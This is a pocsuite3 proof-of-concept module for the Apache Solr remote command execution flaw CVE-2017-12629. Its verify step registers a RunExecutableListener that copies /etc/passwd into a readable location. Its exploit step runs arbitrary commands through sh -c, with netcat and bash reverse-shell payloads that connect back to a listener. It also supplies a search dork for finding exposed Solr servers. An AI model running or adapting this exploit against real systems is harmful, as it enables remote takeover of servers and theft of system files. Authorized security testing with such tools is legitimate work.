"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import base64, json, time
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, CEye
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text, random_str

class DemoPOC(POCBase):
    vulID = '16'  
    author = ['PeiQi']
    name = 'Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。
    '''
    appPowerLink = 'Fhem'
    appName = 'Apache Solr'
    appVersion = '< 7.1'
    fofa_dork = {'fofa': 'app="APACHE-Solr"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": "nc {} {} -e /bin/sh".format(get_listener_ip(), get_listener_port()),
            "bash": REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()),
        }
        o["payload"] = OptDict(default=payload, selected="bash")
        return o

    def _verify(self):
        result = {}
        random_uri = random_str(8)
        url = self.url.rstrip('/') + "/solr/admin/cores?indexInfo=false&wt=json"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if "name" in resp.text and resp.status_code == 200:
                core_name = list(json.loads(resp.text)["status"])[0]
                core_dir = json.loads(resp.text)["status"][core_name]['instanceDir']
                url_2 = self.url.rstrip('/') + "/solr/" + core_name + "/config"
                headers_2 = {
                    "Content-Type": "application/json",
                }
                data_2 = '''{
  "add-listener" : {
    "event":"postCommit",
    "name":"newlistener-%s",
    "class":"solr.RunExecutableListener",
    "exe":"cp",
    "dir":"/usr/bin/",
    "args":["/etc/passwd","%s/conf/%s.txt"]
  }
}''' % (random_uri, core_dir, random_uri)
                _ = requests.post(url_2, data=data_2, headers=headers_2, timeout=5)
                url_3 = self.url.rstrip('/') + "/solr/" + core_name + "/update"
                headers_3 = {
                    "Content-Type": "application/json",
                }
                data_3 = '[{"id":"test-' + random_uri + '"}]'
                # time.sleep(5)
                _ = requests.post(url_3, data=data_3, headers=headers_3, timeout=5)
                if "responseHeader" in resp.text and resp.status_code == 200:
                    url_4 = self.url.rstrip('/') + "/solr/demo/admin/file?file=" + random_uri + ".txt"
                    headers_4 = {
                        "Content-Type": "application/x-www-form-urlencoded",
                    }
                    time.sleep(5)
                    resp = requests.get(url_4, headers=headers_4, timeout=5)
                    if resp.status_code == 200 and "root:" in resp.text:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = url_3
                        result['VerifyInfo']['Response'] = resp.text
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _shell(self):
        cmd = self.get_option("payload")
        self._exploit(cmd)
    
    def _exploit(self, cmd):
        result = {}
        random_uri = random_str(8)
        url = self.url.rstrip('/') + "/solr/admin/cores?indexInfo=false&wt=json"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if "name" in resp.text and resp.status_code == 200:
                core_name = list(json.loads(resp.text)["status"])[0]
                core_dir = json.loads(resp.text)["status"][core_name]['instanceDir']
                url_2 = self.url.rstrip('/') + "/solr/" + core_name + "/config"
                headers_2 = {
                    "Content-Type": "application/json",
                }
                data_2 = '''{
  "add-listener" : {
    "event":"postCommit",
    "name":"newlistener-%s",
    "class":"solr.RunExecutableListener",
    "exe":"sh",
    "dir":"/bin/",
    "args":["-c","%s"]
  }
}''' % (random_uri, cmd)
                _ = requests.post(url_2, data=data_2, headers=headers_2, timeout=5)
                url_3 = self.url.rstrip('/') + "/solr/" + core_name + "/update"
                headers_3 = {
                    "Content-Type": "application/json",
                }
                data_3 = '[{"id":"test-' + random_uri + '"}]'
                # time.sleep(5)
                _ = requests.post(url_3, data=data_3, headers=headers_3, timeout=5)
        except Exception as ex:
            pass
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)